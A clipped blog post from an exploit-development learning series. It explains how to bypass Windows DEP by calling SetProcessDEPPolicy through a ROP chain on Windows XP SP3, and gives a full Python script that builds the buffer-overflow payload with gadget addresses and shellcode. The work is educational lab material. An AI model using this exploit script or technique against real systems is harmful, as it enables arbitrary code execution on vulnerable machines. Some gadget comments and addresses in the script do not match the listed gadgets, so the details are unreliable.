---
title: "[Learning] Bypassing DEP: SetProcessDEPPolicy | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/09/27/2026-9-28-DEP/
source_host: iss4cf0ng.github.io
clip_date: 2026-09-29T22:06:40+08:00
trace_id: 88396e99-7a2a-428d-a060-b6145492f772
content_hash: 5d0ccac4997a152bd04c3f38319feb4095cc0852aa42a69f5ab0386792bece76
status: synced
tags:
  - Windows逆向
  - 漏洞分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: 通过 `SetProcessDEPPolicy(0)` 在 Windows XP SP3 上关闭 DEP，再用 ROP 链调用该 API 并跳入 shellcode，完成缓冲区溢出利用。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3ea75244-d011-8153-95a1-eeb28229b351
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 通过 `SetProcessDEPPolicy(0)` 在 Windows XP SP3 上关闭 DEP，再用 ROP 链调用该 API 并跳入 shellcode，完成缓冲区溢出利用。
> 
> - **API 原理：** `SetProcessDEPPolicy` 仅一个参数，传入 `0` 即禁用 DEP；函数尾部为 `ret 4`（本机地址 `0x7c863114`），内部经 `NtSetInformationProcess` 实现。
> - **缓冲布局：** 以 EDI 为 pivot，依次为 padding A、API 地址、padding B、`jmp esp`、padding C、Shellcode A、padding D（触发溢出）、ROP 链、NOP sled、Shellcode B。
> - **ROP 三步：** rop1 以 `PUSH ESP`+两次 `SUB EAX,30` 把 EDI 定位到距 ESP 60 字节处并 POP EDI；rop2 用 `XOR ECX,ECX` + `MOV [EAX],ECX` 将 `[EDI]` 写 0 作为参数；rop3 用多次 `ADD EAX,-2` 把 EAX 调到 `EDI-4`，最后 `POP ESP` 使栈转向 API 调用。
> - **踩坑点：** 初始化 EDI 时不能用带 `POP EDI` 的 gadget，否则 ROP 链会被破坏；padding A 与 padding D 均可作垃圾数据触发溢出。
> - **实践结论：** 利用脚本无标准答案，差异主要在稳定性；可用 `!mona rop -m *` 搜索 gadget，NOP sled 越长跳转越省事但体积更大。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), I mentioned six common methods to bypass DEP:

1.  `ZwSetInformationProcess`
2.  `SetProcessDEPPolicy`
3.  `VirtualProtect`
4.  `WriteProcessMemory`
5.  `VirtualAlloc & memcpy`
6.  `HeapCreate & HeapAlloc & memcpy`

In this article, I will introduce the second method: using the `SetProcessDEPPolicy` API.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/05a58f9705932721.jpg)

## SetProcessDEPPolicy

According to the [MSDN documentation](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy), a process can disable DEP by passing `0` as the `dwFlags` parameter.

```cpp
BOOL SetProcessDEPPolicy(
  [in] DWORD dwFlags
);
```

Since it only has a single parameter, we can apply the technique from [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/).

## Preparation

First, we can disassemble the `SetProcessDEPPolicy` API with WinDbg. The result is shown below:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/10ad7fdd281407d0.png)

```
0:000> uf setprocessdeppolicy
*** ERROR: Module load completed but symbols could not be loaded for image00400000
kernel32!SetProcessDEPPolicy:
7c863114 8bff            mov     edi,edi
7c863116 55              push    ebp
7c863117 8bec            mov     ebp,esp
7c863119 8b4508          mov     eax,dword ptr [ebp+8]
7c86311c a9fcffffff      test    eax,0FFFFFFFCh
7c863121 7407            je      kernel32!SetProcessDEPPolicy+0x16 (7c86312a)

kernel32!SetProcessDEPPolicy+0xf:
7c863123 680d0000c0      push    0C000000Dh
7c863128 eb3e            jmp     kernel32!SetProcessDEPPolicy+0x54 (7c863168)

kernel32!SetProcessDEPPolicy+0x16:
7c86312a a801            test    al,1
7c86312c 7414            je      kernel32!SetProcessDEPPolicy+0x2e (7c863142)

kernel32!SetProcessDEPPolicy+0x1a:
7c86312e a802            test    al,2
7c863130 c7450809000000  mov     dword ptr [ebp+8],9
7c863137 741a            je      kernel32!SetProcessDEPPolicy+0x3f (7c863153)

kernel32!SetProcessDEPPolicy+0x25:
7c863139 c745080d000000  mov     dword ptr [ebp+8],0Dh
7c863140 eb11            jmp     kernel32!SetProcessDEPPolicy+0x3f (7c863153)

kernel32!SetProcessDEPPolicy+0x2e:
7c863142 6a02            push    2
7c863144 59              pop     ecx
7c863145 84c1            test    cl,al
7c863147 7407            je      kernel32!SetProcessDEPPolicy+0x3c (7c863150)

kernel32!SetProcessDEPPolicy+0x35:
7c863149 68300000c0      push    0C0000030h
7c86314e eb18            jmp     kernel32!SetProcessDEPPolicy+0x54 (7c863168)

kernel32!SetProcessDEPPolicy+0x3c:
7c863150 894d08          mov     dword ptr [ebp+8],ecx

kernel32!SetProcessDEPPolicy+0x3f:
7c863153 6a04            push    4
7c863155 8d4508          lea     eax,[ebp+8]
7c863158 50              push    eax
7c863159 6a22            push    22h
7c86315b 6aff            push    0FFFFFFFFh
7c86315d ff152812807c    call    dword ptr [kernel32!_imp__NtSetInformationProcess (7c801228)]
7c863163 85c0            test    eax,eax
7c863165 7d0a            jge     kernel32!SetProcessDEPPolicy+0x5d (7c863171)

kernel32!SetProcessDEPPolicy+0x53:
7c863167 50              push    eax

kernel32!SetProcessDEPPolicy+0x54:
7c863168 e8cc63faff      call    kernel32!BaseSetLastNTError (7c809539)
7c86316d 33c0            xor     eax,eax
7c86316f eb03            jmp     kernel32!SetProcessDEPPolicy+0x60 (7c863174)

kernel32!SetProcessDEPPolicy+0x5d:
7c863171 33c0            xor     eax,eax
7c863173 40              inc     eax

kernel32!SetProcessDEPPolicy+0x60:
7c863174 5d              pop     ebp
7c863175 c20400          ret     4
```

In my environment, the function is located at `7c863114` and ends with `ret 4`.

Similar to [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), we call the API directly. Therefore, we can arrange the exploit buffer as follows:

```
edi-0x30    : padding A
edi-0x10    : SetProcessDEPPolicy
edi-0x0c    : padding B
edi-0x04    : jmp esp
edi         : padding C, parameters of SetProcessDEPPolicy
edi+0x04    : Shellcode A
edi+0x09    : padding D, used for leading a buffer overflow
edi+0x5c    : rop, overwriting EIP
edi+...     : Shellcode B
```

> Note: There is no standard answer for a ROP exploit chain.

Run the command below in Immunity Debugger to find all available gadgets:

```
!mona rop -m *
```

## Writing ROP Exploit Script

We need to overwrite `EIP` with the first gadget of our ROP chain.

Let’s get started with `rop1`. We use `EDI` as a “pivot”, so we need to initialize it:

1.  `0x7eb9a880`: `# PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
2.  `0x7eb5de9d`: `SUB EAX,30 # POP EBP # RETN`
3.  `0x7eb5de9d`: `SUB EAX,30 # POP EBP # RETN`
4.  `0x7eb5b0e7`: `PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08`

We set the pivot `EDI` to an address that is `60` bytes away from `ESP`.

Next, we set the parameter in `rop2`. We need to put `0` in `[EDI]`:

1.  `0x7eb4dafd`: `# XOR ECX,ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`
2.  `0x77c34dc2`: `# MOV EAX,EDI # POP ESI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
3.  `0x7eb82f36`: `# MOV DWORD PTR DS:[EAX],ECX # RETN ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

In `rop3`, we need to set `ESP` to `[EDI-4]`, causing it to call the API.

1.  `0x77c3dbba`: `# MOV EAX,EDI # POP EDI # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
2.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
3.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
4.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
5.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
6.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
7.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
8.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
9.  `0x77c47844`: `# ADD EAX,-2 # POP EBP # RETN ** [msvcrt.dll] ** | {PAGE_EXECUTE_READ}`
10.  `0x7eb9a9e3`: `# PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08 ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}`

Therefore, the completed ROP exploit script can be implemented as follows:

```python
# exploit.py

import struct

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def read_shellcode() -> bytes:
    shellcode = b''
    with open('messagebox.bin', 'rb') as f:
        shellcode = f.read()

    return shellcode

def sword_two() -> bytes:
    offset = 140

    api = p32(0x7c863114) # SetProcessDEPPolicy
    stack_pivot = p32(0x7c874f13)

    shellcode_A = b'\x89\xe0\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x7f\x83\xc0\x5f\xff\xe0'
    shellcode_B = read_shellcode()

    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5de9d) # SUB EAX,30 # POP EBP # RETN
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eb5b0e7) # PUSH EAX # ADD AL,66 # MOV DWORD PTR DS:[EAX],1B00001 # POP EDI # POP ESI # POP EBP # RETN 0x08
    rop1 += b'1111' # pop esi
    rop1 += b'1111' # pop esi

    rop2 = b''
    rop2 += p32(0x7eb4dafd) # XOR ECX,ECX # RETN
    rop2 += b'22222222' # retn 0x08 from rop1
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP EDI # RETN
    rop2 += b'2222' # pop edi
    rop2 += p32(0x7eb82f36) # MOV DWORD PTR DS:[EAX],ECX # RETN

    rop3 = b''
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN
    rop3 += b'3333' # pop edi
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop3 += b'3333' # pop ebp
    # left 0x08 bytes for retn 0x08

    padding_A = b'A' * 4 # junk
    padding_B = b'B' * 8 # retn 0x08 from rop3
    padding_C = b'C' * 4 # retn 0x04 from SetProcessDEPPolicy

    padding_D = b'D' * (offset - (len(padding_B) + len(padding_C) + len(padding_A) + len(shellcode_A) + len(stack_pivot) + len(api)))

    exploit = b''
    exploit += padding_A
    exploit += api
    exploit += padding_B
    exploit += stack_pivot
    exploit += padding_C
    exploit += shellcode_A
    exploit += padding_D
    exploit += rop1
    exploit += rop2
    exploit += rop3
    exploit += b'\x90' * 400
    exploit += shellcode_B

    return exploit

def main():
    exploit = sword_two()
    with open('exploit_dep.txt', 'wb') as f:
        f.write(exploit)

    print('[+] OK')

if __name__ == '__main__':
    main()
```

Note that both `Padding A` and `Padding D` are junk data. We can use either one to cause the buffer overflow.

Here, I reused the `Shellcode A` from [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/) and used a number of `NOP` (`\x90`) instructions as a NOP sled. Of course, you can use only a few of them and calculate a more precise jump address for `Shellcode A` to reduce the size of the exploit buffer.

Finally, let’s try to exploit it in a Windows XP SP3 virtual machine!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3298c4462515482d.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/6889e143e56c247e.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5c39a32fd906514a.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1b6881edf351fa06.png)

## Conclusion

This article is similar to [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), but uses a different API.

Honestly, since I have gained some experience from [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), I spent only a short amount of time developing the complete exploit script.

In conclusion, I want to mention some practical issues that I have encountered so far.

If we are trying to initialize `EDI`, we should not use a gadget containing a `POP EDI` instruction. Otherwise, the ROP chain might be corrupted.

Both `Padding A` and `Padding D` can be treated as junk data. The most important point is that they are used to cause the buffer overflow.

There is no standard answer for a ROP exploit script. The main difference is stability.

Alright! This is the end of this article. In the next article, I will study the third method.

If you have any comments or suggestions, please feel free to leave them below!

## THANKS FOR READING!

I drew a [new drawing](https://www.pixiv.net/artworks/150084856)!

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2f877dda9b395073.jpg)

Morning...
